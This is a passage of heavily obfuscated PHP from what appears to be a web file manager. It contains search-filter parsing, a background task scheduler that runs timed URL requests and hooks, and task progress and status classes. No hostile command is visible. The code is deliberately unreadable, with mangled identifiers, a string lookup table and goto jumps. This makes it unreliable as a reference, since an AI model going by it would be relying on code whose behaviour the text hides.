$Ÿ¥ÆÂì­ = is_array($Ÿ¥ÆÂì­) ? $Ÿ¥ÆÂì­ : explode($÷İÁàú…[50], $Ÿ¥ÆÂì­); $‡°Å¿§[$÷İÁàú…[488]] = array($÷İÁàú…[494], $Ÿ¥ÆÂì­); $‡°Å¿§[$÷İÁàú…[487]] = 0; } } } } $this->_parseSearchParent($ë¾¸ˆ¤‹, $‡°Å¿§); if (isset($ë¾¸ˆ¤‹[$÷İÁàú…[2069]]) && trim($ë¾¸ˆ¤‹[$÷İÁàú…[2069]])) { $úÙÎŒ½Ê = trim($ë¾¸ˆ¤‹[$÷İÁàú…[2069]]); $«¼–ƒ“½ = explode($÷İÁàú…[53], $úÙÎŒ½Ê); if (strlen($úÙÎŒ½Ê) > 2 && (substr($úÙÎŒ½Ê, 0, 1) == $÷İÁàú…[121] && substr($úÙÎŒ½Ê, -1) == $÷İÁàú…[121]) || substr($úÙÎŒ½Ê, 0, 1) == $÷İÁàú…[58] && substr($úÙÎŒ½Ê, -1) == $÷İÁàú…[58]) { $úÙÎŒ½Ê = substr($úÙÎŒ½Ê, 1, -1); $«¼–ƒ“½ = array($úÙÎŒ½Ê); } $‡°Å¿§[$÷İÁàú…[32]] = array(array($÷İÁàú…[617], $÷İÁàú…[2071] . $úÙÎŒ½Ê . $÷İÁàú…[2071])); if (count($«¼–ƒ“½) > 1) { $‡°Å¿§[$÷İÁàú…[32]] = array(); foreach ($«¼–ƒ“½ as $¦•ëçÌ) { if (!trim($¦•ëçÌ)) { continue; } $‡°Å¿§[$÷İÁàú…[32]][] = array($÷İÁàú…[617], $÷İÁàú…[2071] . trim($¦•ëçÌ) . $÷İÁàú…[2071]); } } } return $‡°Å¿§; } private function _parseSearchParent($êÎÍÖÈ¼, &$‰±Â¼´Ú) { $ÔÄàçú² =& $_SERVER[Š—Â“œÔ]; if (!isset($êÎÍÖÈ¼[$ÔÄàçú²[192]]) || !$êÎÍÖÈ¼[$ÔÄàçú²[192]]) { return; } $“Öêª– = $this->pathInfo($êÎÍÖÈ¼[$ÔÄàçú²[192]]); $ÇúÚËª´ = $“Öêª–[$ÔÄàçú²[192]] . $ÔÄàçú²[12] === $ÔÄàçú²[230]; $ÎÍû¾¤È = $“Öêª–[$ÔÄàçú²[190]] == $ÔÄàçú²[580]; if ($“Öêª–[$ÔÄàçú²[596]] == $ÔÄàçú²[597]) { $©ÆÆÓó‚ = $this->sourceInfo($êÎÍÖÈ¼[$ÔÄàçú²[192]]); $“Öêª–[$ÔÄàçú²[586]] = $©ÆÆÓó‚[$ÔÄàçú²[586]]; } $‰±Â¼´Ú[$ÔÄàçú²[657]] = array($ÔÄàçú²[617], $“Öêª–[$ÔÄàçú²[586]] . $êÎÍÖÈ¼[$ÔÄàçú²[192]] . $ÔÄàçú²[618]); $äï¶öÏİ = isset($êÎÍÖÈ¼[$ÔÄàçú²[1929]]) && in_array($ÔÄàçú²[580], $êÎÍÖÈ¼[$ÔÄàçú²[1929]]); if (!$äï¶öÏİ || !$ÎÍû¾¤È || !$ÇúÚËª´ || !$“Öêª–[$ÔÄàçú²[489]]) { return; } if (!AuthModel::authCheckRoot($“Öêª–[$ÔÄàçú²[489]][$ÔÄàçú²[490]])) { return; } $Ğìîí”¢ = $“Öêª–[$ÔÄàçú²[571]] . $ÔÄàçú²[12]; if ($Ğìîí”¢ == $ÔÄàçú²[91]) { unset($‰±Â¼´Ú[$ÔÄàçú²[657]]); $‰±Â¼´Ú[$ÔÄàçú²[190]] = self::TYPE_GROUP; return; } $ÄÆ°ğâµ = Model($ÔÄàçú²[587])->groupChildrenAll($Ğìîí”¢); $ÉìúôàÃ = count($ÄÆ°ğâµ); if ($ÉìúôàÃ <= 1) { return; } $ˆÂ‰‹Ô¤ = array($ÔÄàçú²[192] => 0, $ÔÄàçú²[190] => self::TYPE_GROUP, $ÔÄàçú²[571] => array($ÔÄàçú²[7], $ÄÆ°ğâµ)); $²±‚¦òŞ = $this->field($ÔÄàçú²[2251])->where($ˆÂ‰‹Ô¤)->limit($ÉìúôàÃ)->select(); $‰±Â¼´Ú[$ÔÄàçú²[657]] = array(); foreach ($²±‚¦òŞ as $îıõÙŞİ) { $‰±Â¼´Ú[$ÔÄàçú²[657]][] = array($ÔÄàçú²[617], $ÔÄàçú²[595] . $îıõÙŞİ[$ÔÄàçú²[193]] . $ÔÄàçú²[618]); } $‰±Â¼´Ú[$ÔÄàçú²[657]][] = $ÔÄàçú²[2073]; } } goto C‘ÉÇ•Ìö; a³‚ïï¹¤Ù: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $½“¤¸¨‹ =& $_SERVER[Š—Â“œÔ]; if (self::valueGet($½“¤¸¨‹[817]) != $½“¤¸¨‹[91]) { return; } if (self::valueGet($½“¤¸¨‹[1719]) == $½“¤¸¨‹[91]) { $±¬Ë¼Œ = self::valueGet($½“¤¸¨‹[1720]); if (time() - $±¬Ë¼Œ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($½“¤¸¨‹[1719], $½“¤¸¨‹[91]); self::log($½“¤¸¨‹[1721] . ACTION . $½“¤¸¨‹[1722]); Hook::bind($½“¤¸¨‹[1723], $½“¤¸¨‹[1724]); $÷Ùúãä³ = 0; while (!0) { self::cacheClear(); if (self::valueGet($½“¤¸¨‹[817]) != $½“¤¸¨‹[91]) { self::valueSet($½“¤¸¨‹[1719], $½“¤¸¨‹[230]); self::log($½“¤¸¨‹[1725]); die; } $£Ü—ú¢ã = time(); if ($£Ü—ú¢ã - $÷Ùúãä³ >= 60) { self::valueSet(array($½“¤¸¨‹[1719] => $½“¤¸¨‹[91], $½“¤¸¨‹[1720] => $£Ü—ú¢ã)); $÷Ùúãä³ = $£Ü—ú¢ã; } if (!file_exists(USER_SYSTEM . $½“¤¸¨‹[1726])) { self::valueSet(array($½“¤¸¨‹[1719] => $½“¤¸¨‹[230], $½“¤¸¨‹[817] => $½“¤¸¨‹[230])); self::log($½“¤¸¨‹[1727]); die; } $Ûş®ªá = file_get_contents(BASIC_PATH . $½“¤¸¨‹[1728]); $â­í¨Ô§ = KOD_VERSION . $½“¤¸¨‹[10] . KOD_VERSION_BUILD; $ı¾ÖÊÒÔ = match_text($Ûş®ªá, $½“¤¸¨‹[1729]) . $½“¤¸¨‹[10] . match_text($Ûş®ªá, $½“¤¸¨‹[1730]); if ($ı¾ÖÊÒÔ != $â­í¨Ô§) { self::restart(); self::log("\x73\x74\x6f\x70\x65\x64\x2e\x5b\166\x65\162\x73\151\x6f\x6e\40\x75\x70\x64\141\164\x65\x3b{$versionNow}\40\x3d\76\x20{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $ìÂ‚àÙ© =& $_SERVER[Š—Â“œÔ]; http_close(); $GLOBALS[$ìÂ‚àÙ©[1731]] = 1; $_SERVER[$ìÂ‚àÙ©[1732]] = $ìÂ‚àÙ©[1733]; $_COOKIE = array(); $GLOBALS[$ìÂ‚àÙ©[1734]] = 1; $GLOBALS[$ìÂ‚àÙ©[1735]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $×‚–õŸ =& $_SERVER[Š—Â“œÔ]; http_close(); self::valueSet($×‚–õŸ[817], $×‚–õŸ[230]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($×‚–õŸ[1719] => $×‚–õŸ[230], $×‚–õŸ[817] => $×‚–õŸ[91])); self::log($×‚–õŸ[1736]); } public static function taskSwitch() { $’‚À£üÈ =& $_SERVER[Š—Â“œÔ]; $»ã¹¬´ğ = self::valueGet($’‚À£üÈ[817]) == $’‚À£üÈ[91] ? $’‚À£üÈ[230] : $’‚À£üÈ[91]; self::valueSet($’‚À£üÈ[817], $»ã¹¬´ğ); } public static function shutdownEvent() { $Äûì”é° =& $_SERVER[Š—Â“œÔ]; self::valueSet($Äûì”é°[1719], $Äûì”é°[230]); self::log($Äûì”é°[1737]); } public static function config($¦²ûÑÂ, $ß“ª½Œ) { self::valueSet($_SERVER[Š—Â“œÔ][817], $¦²ûÑÂ); } private static function taskRunAll() { $¢“­‘ÄË =& $_SERVER[Š—Â“œÔ]; $í¼Éıµº = timeFloat(); $²ÀÄã‹Ë = Model($¢“­‘ÄË[1738])->listData(); $¾â¤Ò°Ç = count($²ÀÄã‹Ë); for ($ÓõĞÆ = 0; $ÓõĞÆ < $¾â¤Ò°Ç; $ÓõĞÆ++) { $¹©ñ Õ¼ = $²ÀÄã‹Ë[$ÓõĞÆ]; if (!$¹©ñ Õ¼[$¢“­‘ÄË[477]] || $¹©ñ Õ¼[$¢“­‘ÄË[1739]] != $¢“­‘ÄË[91]) { continue; } if (!self::taskTimeCheck($¹©ñ Õ¼)) { continue; } self::taskRun($¹©ñ Õ¼); } Hook::trigger($¢“­‘ÄË[1740]); self::taskQueueRun($í¼Éıµº); } private static function taskQueueRun($Ö·†áŒ§) { $¼£şƒ» = 10; while (!0) { $ç›ø ì = TaskQueue::run(); if ($ç›ø ì === !1) { break; } if (timeFloat() - $Ö·†áŒ§ >= $¼£şƒ») { break; } } } private static function taskTimeCheck($œñš‡è‹) { $áµ¯õˆØ =& $_SERVER[Š—Â“œÔ]; $˜¶·üíº = json_decode($œñš‡è‹[$áµ¯õˆØ[206]], !0); $‚µë—¸ = intval($œñš‡è‹[$áµ¯õˆØ[1720]]); $È¨¾Ğ‰Û = strtotime($áµ¯õˆØ[1741] . $˜¶·üíº[$áµ¯õˆØ[1742]] . $áµ¯õˆØ[1743]) - strtotime($áµ¯õˆØ[1744]); $¶ˆÜÃèƒ = time() - strtotime(date($áµ¯õˆØ[1745]) . $áµ¯õˆØ[1746]); $ÆÁÕûóì = $¶ˆÜÃèƒ >= $È¨¾Ğ‰Û && $¶ˆÜÃèƒ <= $È¨¾Ğ‰Û + 3600; switch ($˜¶·üíº[$áµ¯õˆØ[33]]) { case $áµ¯õˆØ[1747]: if (time() - $‚µë—¸ < 3600 * 24 * 30) { return !1; } if ($˜¶·üíº[$áµ¯õˆØ[1747]] == date($áµ¯õˆØ[1748]) && $ÆÁÕûóì) { return !0; } break; case $áµ¯õˆØ[1749]: if (time() - $‚µë—¸ < 3600 * 24 * 7) { return !1; } $ı˜¥óşî = date($áµ¯õˆØ[1750]) == 0 ? 7 : date($áµ¯õˆØ[1750]); if ($˜¶·üíº[$áµ¯õˆØ[1749]] == $ı˜¥óşî && $ÆÁÕûóì) { return !0; } break; case $áµ¯õˆØ[1742]: if (time() - $‚µë—¸ < 3600 * 24) { return !1; } if ($ÆÁÕûóì) { return !0; } break; case $áµ¯õˆØ[1751]: if (time() - $‚µë—¸ >= floatval($˜¶·üíº[$áµ¯õˆØ[1751]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $œáˆÁİŒ =& $_SERVER[Š—Â“œÔ]; static $Ùñââˆ• = 0; $şË“¥Šİ = 300; if (!$Ùñââˆ•) { $Ùñââˆ• = time(); } if (time() - $Ùñââˆ• < $şË“¥Šİ) { return; } $Ùñââˆ• = time(); $æºÇº–’ = Model($œáˆÁİŒ[579])->db($œáˆÁİŒ[12]); if ($æºÇº–’) { $æºÇº–’->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($œáˆÁİŒ[1752], $œáˆÁİŒ[1753]); die; } } public static function taskRun($Ì®œ‰) { $Ñ’ĞîÜ =& $_SERVER[Š—Â“œÔ]; self::log($Ñ’ĞîÜ[1754] . $Ì®œ‰[$Ñ’ĞîÜ[477]] . $Ñ’ĞîÜ[1755] . $Ì®œ‰[$Ñ’ĞîÜ[32]] . $Ñ’ĞîÜ[1756] . $Ì®œ‰[$Ñ’ĞîÜ[1757]]); Model($Ñ’ĞîÜ[1738])->run($Ì®œ‰[$Ñ’ĞîÜ[477]]); $Ç““ã¯ = timeFloat(); $ÎíÓØ = $Ñ’ĞîÜ[12]; switch ($Ì®œ‰[$Ñ’ĞîÜ[33]]) { case $Ñ’ĞîÜ[384]: $…šÏ ¬ = url_request($Ì®œ‰[$Ñ’ĞîÜ[1757]], $Ñ’ĞîÜ[1494], !1, !1, !1, !1, 10); if ($…šÏ ¬[$Ñ’ĞîÜ[817]]) { $ÎíÓØ = strlen($…šÏ ¬[$Ñ’ĞîÜ[1284]]); } break; case $Ñ’ĞîÜ[1758]: $ÎíÓØ = Hook::apply($Ì®œ‰[$Ñ’ĞîÜ[1757]]); default: break; } Model($Ñ’ĞîÜ[1759])->add(array($Ñ’ĞîÜ[1760] => $Ñ’ĞîÜ[12], $Ñ’ĞîÜ[1761] => $Ñ’ĞîÜ[230], $Ñ’ĞîÜ[33] => $Ñ’ĞîÜ[1762] . $Ì®œ‰[$Ñ’ĞîÜ[477]], $Ñ’ĞîÜ[1763] => json_encode(array($Ñ’ĞîÜ[32] => $Ì®œ‰[$Ñ’ĞîÜ[32]], $Ñ’ĞîÜ[1764] => timeFloat() - $Ç““ã¯, $Ñ’ĞîÜ[370] => $ÎíÓØ)))); $À²áº•ë = $ÎíÓØ ? $Ñ’ĞîÜ[1765] . $ÎíÓØ : $Ñ’ĞîÜ[12]; self::log($Ñ’ĞîÜ[1766] . $Ì®œ‰[$Ñ’ĞîÜ[477]] . $Ñ’ĞîÜ[178] . $À²áº•ë); return !0; } public static function valueGet($¬Ò¡æĞ›) { $õÆáŠÉİ =& $_SERVER[Š—Â“œÔ]; $â÷‚³šç = $õÆáŠÉİ[1767]; $Ë½åü = Model($õÆáŠÉİ[510])->get($¬Ò¡æĞ›, $â÷‚³šç); if (is_null($Ë½åü)) { Model($õÆáŠÉİ[510])->set($õÆáŠÉİ[817], $õÆáŠÉİ[91], $â÷‚³šç); Model($õÆáŠÉİ[510])->set($õÆáŠÉİ[1719], $õÆáŠÉİ[230], $â÷‚³šç); $Ë½åü = Model($õÆáŠÉİ[510])->get($¬Ò¡æĞ›, $â÷‚³šç); } return $Ë½åü; } private static function valueSet($æŒç©‹, $Ì§‰ËØ = false) { $óÂßú—ş =& $_SERVER[Š—Â“œÔ]; $‹§œØ–· = $óÂßú—ş[1768]; CacheLock::lock($‹§œØ–·); $ˆş‹„İÊ = Model($óÂßú—ş[510])->set($æŒç©‹, $Ì§‰ËØ, $óÂßú—ş[1767]); CacheLock::unlock($‹§œØ–·); return $ˆş‹„İÊ; } protected static function log($Ìäİ—ê«) { write_log($Ìäİ—ê«, $_SERVER[Š—Â“œÔ][1753]); } private static function cacheClear() { $¢†ƒØ£ı =& $_SERVER[Š—Â“œÔ]; Cache::clearMemory(Model($¢†ƒØ£ı[510])->cacheKey($¢†ƒØ£ı[1767])); Cache::clearMemory(Model($¢†ƒØ£ı[510])->cacheKey($¢†ƒØ£ı[1769])); Model($¢†ƒØ£ı[1738])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\x6f\x70"; const STATYS_RUNNING = "\x72\x75\156\156\151\156\x67"; const STATYS_KILL = "\x6b\x69\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($±¢´Š•, $ƒÕÀöÁÊ = '', $¯¥Ğ¢¢Ò = 0, $Ç¹ËÂÍ = '') { $Ï„‘„Ì´ =& $_SERVER[Š—Â“œÔ]; if (self::get($±¢´Š•)) { return; } $this->task = array($Ï„‘„Ì´[477] => $±¢´Š•, $Ï„‘„Ì´[1770] => USER_ID, $Ï„‘„Ì´[1658] => $Ç¹ËÂÍ, $Ï„‘„Ì´[528] => $Ï„‘„Ì´[12], $Ï„‘„Ì´[33] => $ƒÕÀöÁÊ, $Ï„‘„Ì´[1139] => $Ï„‘„Ì´[12], $Ï„‘„Ì´[1137] => $¯¥Ğ¢¢Ò, $Ï„‘„Ì´[1771] => 0, $Ï„‘„Ì´[1772] => 0, $Ï„‘„Ì´[1773] => 0, $Ï„‘„Ì´[1774] => timeFloat(), $Ï„‘„Ì´[1775] => 0, $Ï„‘„Ì´[1776] => 0, $Ï„‘„Ì´[1777] => 0, $Ï„‘„Ì´[1778] => 0, $Ï„‘„Ì´[817] => $Ï„‘„Ì´[1719]); $GLOBALS[$Ï„‘„Ì´[1779]] = 1; Hook::bind($Ï„‘„Ì´[1723], array($this, $Ï„‘„Ì´[1780])); Hook::bind($Ï„‘„Ì´[1781], array($this, $Ï„‘„Ì´[1782])); $this->startAfter(); Hook::trigger($Ï„‘„Ì´[1783], $this->task); $this->task[$Ï„‘„Ì´[1776]] = timeFloat(); } public function end($ò¥ïï®Í = '') { $êñµ†°† =& $_SERVER[Š—Â“œÔ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$êñµ†°†[1776]]) { self::valueSet($this->task[$êñµ†°†[477]], !1); } $this->isEnd = !0; if ($ò¥ïï®Í) { $this->task[$êñµ†°†[528]] = $ò¥ïï®Í; } self::log($êñµ†°†[1784] . $this->task[$êñµ†°†[477]] . $êñµ†°†[1785] . sprintf($êñµ†°†[919], timeFloat() - $this->task[$êñµ†°†[1774]]) . $êñµ†°†[1786]); Hook::unbind($êñµ†°†[1723], array($this, $êñµ†°†[1780])); Hook::unbind($êñµ†°†[1781], array($this, $êñµ†°†[1782])); $this->endAfter(); $®ûùæ¸ = $this->task; $this->task = !1; Hook::trigger($êñµ†°†[1787], $®ûùæ¸); } public function update($øìíëÏŞ = 0, $‹¿Ùâ¡ü = false) { $§îÏ°³Î =& $_SERVER[Š—Â“œÔ]; $íÖ£óá¢ =& $this->task; if (!$íÖ£óá¢) { return; } $íÖ£óá¢[$§îÏ°³Î[1771]] += $øìíëÏŞ; $íÖ£óá¢[$§îÏ°³Î[1775]] = timeFloat(); if ($íÖ£óá¢[$§îÏ°³Î[1137]]) { if ($íÖ£óá¢[$§îÏ°³Î[1137]] < $íÖ£óá¢[$§îÏ°³Î[1771]]) { $íÖ£óá¢[$§îÏ°³Î[1137]] = $íÖ£óá¢[$§îÏ°³Î[1771]]; } $€Á·ª×ğ = timeFloat() - $íÖ£óá¢[$§îÏ°³Î[1774]] - $íÖ£óá¢[$§îÏ°³Î[1777]]; if ($€Á·ª×ğ <= 0) { $€Á·ª×ğ = 0.001; } $íÖ£óá¢[$§îÏ°³Î[1772]] = $íÖ£óá¢[$§îÏ°³Î[1771]] / $íÖ£óá¢[$§îÏ°³Î[1137]]; $íÖ£óá¢[$§îÏ°³Î[1773]] = $íÖ£óá¢[$§îÏ°³Î[1771]] / $€Á·ª×ğ; if ($íÖ£óá¢[$§îÏ°³Î[1772]] > 0) { $íÖ£óá¢[$§îÏ°³Î[1778]] = $€Á·ª×ğ * (1 - $íÖ£óá¢[$§îÏ°³Î[1772]]) / $íÖ£óá¢[$§îÏ°³Î[1772]]; } $íÖ£óá¢[$§îÏ°³Î[1778]] = $íÖ£óá¢[$§îÏ°³Î[1778]] <= 0 ? 0 : $íÖ£óá¢[$§îÏ°³Î[1778]]; } $this->updateAfter(); $²âèÉ£¼ = 0.2; if (timeFloat() - $íÖ£óá¢[$§îÏ°³Î[1776]] < $²âèÉ£¼ && !$‹¿Ùâ¡ü) { return; } $èÓ…åúè = self::get($íÖ£óá¢[$§îÏ°³Î[477]]); $ÅµàÃ¸å = $èÓ…åúè[$§îÏ°³Î[817]]; if ($ÅµàÃ¸å == self::STATYS_KILL) { $Ú­ıØòò = array($§îÏ°³Î[1788] => LNG($§îÏ°³Î[1789]), $§îÏ°³Î[1294] => !1); Cache::set($§îÏ°³Î[1790] . $this->task[$§îÏ°³Î[477]], $Ú­ıØòò, 30); $this->onKill(); $this->end(); die; } else { if ($ÅµàÃ¸å == self::STATYS_STOP) { $¢å´Ü¾£ = 2; $èÓ…åúè[$§îÏ°³Î[1777]] += $¢å´Ü¾£; self::valueSet($íÖ£óá¢[$§îÏ°³Î[477]], $èÓ…åúè); sleep($¢å´Ü¾£); $this->update(); return; } } $íÖ£óá¢[$§îÏ°³Î[817]] = $ÅµàÃ¸å ? $ÅµàÃ¸å : $íÖ£óá¢[$§îÏ°³Î[817]]; $íÖ£óá¢[$§îÏ°³Î[1777]] = $èÓ…åúè[$§îÏ°³Î[1777]] ? $èÓ…åúè[$§îÏ°³Î[1777]] : 0; $íÖ£óá¢[$§îÏ°³Î[1776]] = timeFloat(); Hook::trigger($§îÏ°³Î[1791], $íÖ£óá¢); self::valueSet($íÖ£óá¢[$§îÏ°³Î[477]], $íÖ£óá¢); } public function onKillSet($°³Ç¬“£, $¨®’ıçĞ = array()) { $this->onKillCall = array($°³Ç¬“£, $¨®’ıçĞ); } public function onKill() { $”Êßİ”  =& $_SERVER[Š—Â“œÔ]; self::log($”Êßİ” [1784] . $this->task[$”Êßİ” [477]] . $”Êßİ” [1792]); Hook::trigger($”Êßİ” [1793], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($®é×“œæ) { $†ø’¦’Ô =& $_SERVER[Š—Â“œÔ]; Cache::set($†ø’¦’Ô[1790] . $this->task[$†ø’¦’Ô[477]], $®é×“œæ, 60); if (!is_array($®é×“œæ) || !$®é×“œæ[$†ø’¦’Ô[1294]]) { self::log($†ø’¦’Ô[1794] . json_encode($®é×“œæ)); } return $®é×“œæ; } public static function get($¸Ş‰å¿¹) { $•Ÿë±ñ˜ =& $_SERVER[Š—Â“œÔ]; $½ÃåıÕÚ = self::valueGet($¸Ş‰å¿¹); if (is_array($½ÃåıÕÚ) && $½ÃåıÕÚ[$•Ÿë±ñ˜[1795]]) { $¿İ¨¾· = ActionApply($½ÃåıÕÚ[$•Ÿë±ñ˜[1795]], array($½ÃåıÕÚ)); $½ÃåıÕÚ = is_array($¿İ¨¾·) ? $¿İ¨¾· : $½ÃåıÕÚ; } return $½ÃåıÕÚ; } public static function listData() { $áº Ûñİ = self::valueGet(); return array_sort_by($áº Ûñİ, $_SERVER[Š—Â“œÔ][1774], !0); } public static function kill($¨×”¢‚Ş) { return self::changeStatus($¨×”¢‚Ş, self::STATYS_KILL); } public static function stop($ÛÃª¨ÍÖ) { return self::changeStatus($ÛÃª¨ÍÖ, self::STATYS_STOP); } public static function restart($Õô¹˜—İ) { return self::changeStatus($Õô¹˜—İ, self::STATYS_RUNNING); } public static function killAll() { $£ı‚öõ¶ =& $_SERVER[Š—Â“œÔ]; $×‡×Í™è = self::listData(); foreach ($×‡×Í™è as $¿ûåäµ¦) { self::kill($¿ûåäµ¦[$£ı‚öõ¶[477]]); } sleep(2); foreach ($×‡×Í™è as $¿ûåäµ¦) { self::valueSet($¿ûåäµ¦[$£ı‚öõ¶[477]], !1); } } private static function changeStatus($ò†şÏôœ, $Ã †‰»Ï) { $äĞèºÕ =& $_SERVER[Š—Â“œÔ]; $İĞàÃñ¥ = self::valueGet($ò†şÏôœ); if (!$İĞàÃñ¥) { return !1; } $İĞàÃñ¥[$äĞèºÕ[817]] = $Ã †‰»Ï; self::valueSet($ò†şÏôœ, $İĞàÃñ¥); self::log($äĞèºÕ[1796] . $İĞàÃñ¥[$äĞèºÕ[477]] . $äĞèºÕ[1797] . $Ã †‰»Ï); return !0; } public static function valueGet($«”•§ì = false) { $Ï¶¢ˆ’Ä =& $_SERVER[Š—Â“œÔ]; if ($«”•§ì) { $†ä°ÍÛ’ = Model($Ï¶¢ˆ’Ä[522])->where(array($Ï¶¢ˆ’Ä[97] => $«”•§ì, $Ï¶¢ˆ’Ä[33] => $Ï¶¢ˆ’Ä[1146]))->find(); return $†ä°ÍÛ’ ? json_decode($†ä°ÍÛ’[$Ï¶¢ˆ’Ä[452]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($íÖÎÚıŸ = false) { $ùúÅ¼Ğ‡ =& $_SERVER[Š—Â“œÔ]; $ö¿·É¨ò = array($ùúÅ¼Ğ‡[33] => $ùúÅ¼Ğ‡[1146]); if ($íÖÎÚıŸ) { $ö¿·É¨ò[$ùúÅ¼Ğ‡[1770]] = $íÖÎÚıŸ; } $¼„Ú¡· = Model($ùúÅ¼Ğ‡[522])->where($ö¿·É¨ò)->select(); $¼„Ú¡· = $¼„Ú¡· ? $¼„Ú¡· : array(); foreach ($¼„Ú¡· as $ÆÃˆøìÎ => $ÃÜÒ¯ú) { $¼„Ú¡·[$ÆÃˆøìÎ] = json_decode($ÃÜÒ¯ú[$ùúÅ¼Ğ‡[452]], !0); } return $¼„Ú¡·; } public static function valueSet($Ú©ñŒé, $³çŸû»¸) { $îçß£ =& $_SERVER[Š—Â“œÔ]; if (!$³çŸû»¸) { return Model($îçß£[522])->where(array($îçß£[97] => $Ú©ñŒé, $îçß£[33] => $îçß£[1146]))->delete(); } $¨íôÎÜ¡ = json_encode($³çŸû»¸); if (!$¨íôÎÜ¡) { ob_start(); var_dump($³çŸû»¸); $¡–Ëº‡± = ob_get_clean(); self::log($îçß£[1798] . json_encode_force($¡–Ëº‡±)); } if (!$Ú©ñŒé || !$³çŸû»¸[$îçß£[477]]) { return !1; } $±Óì“Ú = array($îçß£[33] => $îçß£[1146], $îçß£[1770] => USER_ID, $îçß£[97] => $Ú©ñŒé, $îçß£[452] => $¨íôÎÜ¡); $Œ„€·£ = $îçß£[1799]; CacheLock::lock($Œ„€·£); Model($îçß£[522])->add($±Óì“Ú, array(), !0); CacheLock::unlock($Œ„€·£); } public static function log($À¾ØÔÖ) { if (!GLOBAL_DEBUG) { return; } write_log($À¾ØÔÖ, $_SERVER[Š—Â“œÔ][1800]); } } class TaskFileTransfer extends Task { protected function startAfter() { $äİ‘‹íª =& $_SERVER[Š—Â“œÔ]; $Ä½œèûÁ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($äİ‘‹íª[1801], array($this, $äİ‘‹íª[1802])); Hook::bind($äİ‘‹íª[1306], array($this, $äİ‘‹íª[1803])); Hook::bind($äİ‘‹íª[1804], array($this, $äİ‘‹íª[1805])); Hook::bind($äİ‘‹íª[673], array($this, $äİ‘‹íª[1806])); Hook::bind($äİ‘‹íª[674], array($this, $äİ‘‹íª[1807])); Hook::bind($äİ‘‹íª[680], array($this, $äİ‘‹íª[1808])); Hook::bind($äİ‘‹íª[681], array($this, $äİ‘‹íª[1809])); Hook::bind($äİ‘‹íª[676], array($this, $äİ‘‹íª[1810])); Hook::bind($äİ‘‹íª[678], array($this, $äİ‘‹íª[1811])); Hook::bind($äİ‘‹íª[642], array($this, $äİ‘‹íª[1812])); Hook::bind($äİ‘‹íª[639], array($this, $äİ‘‹íª[1812])); Hook::bind($äİ‘‹íª[644], array($this, $äİ‘‹íª[1812])); Hook::bind($äİ‘‹íª[646], array($this, $äİ‘‹íª[1812])); Hook::bind($äİ‘‹íª[648], array($this, $äİ‘‹íª[1812])); Hook::bind($äİ‘‹íª[1813], array($this, $äİ‘‹íª[1814])); Hook::bind($äİ‘‹íª[664], array($this, $äİ‘‹íª[1815])); $this->sourceModelCopyFlag = !1; Hook::bind($äİ‘‹íª[1816], array($this, $äİ‘‹íª[1817])); Hook::bind($äİ‘‹íª[1818], array($this, $äİ‘‹íª[1819])); Hook::bind($äİ‘‹íª[1820], array($this, $äİ‘‹íª[1821])); $Ä½œèûÁ[$äİ‘‹íª[1822]] = LNG($äİ‘‹íª[1823]); $Ä½œèûÁ[$äİ‘‹íª[1824]] = 0; $Ä½œèûÁ[$äİ‘‹íª[1825]] = 0; $Ä½œèûÁ[$äİ‘‹íª[1139]] = $äİ‘‹íª[12]; $Ä½œèûÁ[$äİ‘‹íª[1826]] = $äİ‘‹íª[12]; $Ä½œèûÁ[$äİ‘‹íª[1827]] = 0; $Ä½œèûÁ[$äİ‘‹íª[1828]] = 0; $Ä½œèûÁ[$äİ‘‹íª[1829]] = 0; if (!$Ä½œèûÁ[$äİ‘‹íª[1658]]) { $Ä½œèûÁ[$äİ‘‹íª[1658]] = LNG($äİ‘‹íª[1830]); } } protected function endAfter() { $âø´æØ² =& $_SERVER[Š—Â“œÔ]; Hook::unbind($âø´æØ²[1801], array($this, $âø´æØ²[1802])); Hook::unbind($âø´æØ²[1306], array($this, $âø´æØ²[1803])); Hook::unbind($âø´æØ²[1804], array($this, $âø´æØ²[1805])); Hook::unbind($âø´æØ²[673], array($this, $âø´æØ²[1806])); Hook::unbind($âø´æØ²[674], array($this, $âø´æØ²[1807])); Hook::unbind($âø´æØ²[680], array($this, $âø´æØ²[1808])); Hook::unbind($âø´æØ²[681], array($this, $âø´æØ²[1809])); Hook::unbind($âø´æØ²[676], array($this, $âø´æØ²[1810])); Hook::unbind($âø´æØ²[678], array($this, $âø´æØ²[1811])); Hook::unbind($âø´æØ²[642], array($this, $âø´æØ²[1812])); Hook::unbind($âø´æØ²[639], array($this, $âø´æØ²[1812])); Hook::unbind($âø´æØ²[644], array($this, $âø´æØ²[1812])); Hook::unbind($âø´æØ²[646], array($this, $âø´æØ²[1812])); Hook::unbind($âø´æØ²[648], array($this, $âø´æØ²[1812])); Hook::unbind($âø´æØ²[1813], array($this, $âø´æØ²[1814])); Hook::unbind($âø´æØ²[664], array($this, $âø´æØ²[1815])); Hook::unbind($âø´æØ²[1816], array($this, $âø´æØ²[1817])); Hook::unbind($âø´æØ²[1818], array($this, $âø´æØ²[1819])); Hook::unbind($âø´æØ²[1820], array($this, $âø´æØ²[1821])); } public function copyMoveStart($Ç•¼, $¾“µÎŒ, $»Ã²ä±ş, $ÑÀ¥“©Â) { $šğáÊÃù =& $_SERVER[Š—Â“œÔ]; self::log($šğáÊÃù[1831] . $¾“µÎŒ . $šğáÊÃù[73] . $ÑÀ¥“©Â); $œâ¤øüÑ = rtrim(TEMP_FILES, $šğáÊÃù[8]); if (substr($¾“µÎŒ, 0, strlen($œâ¤øüÑ)) == 